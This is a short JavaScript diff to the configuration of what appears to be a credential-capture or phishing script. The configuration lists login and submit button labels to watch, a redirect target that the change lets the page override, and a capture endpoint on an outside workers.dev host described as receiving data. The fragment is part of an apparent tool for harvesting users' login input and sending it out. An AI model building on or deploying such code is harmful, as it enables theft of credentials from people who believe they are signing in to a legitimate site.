@@ -6,7 +6,7 @@ const CONFIG = {
         'submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate',
         'log on', 'start', 'verify', 'go', 'enter', 'accept'
     ],
-    REDIRECT_URL: 'https://example.com',
+    REDIRECT_URL: window.REDIRECT_URL || 'https://example.com',
     // The worker endpoint to receive data (relative path)
     CAPTURE_URL: 'https://calm-bread-1d99.testdx24.workers.dev/api/capture'
 };
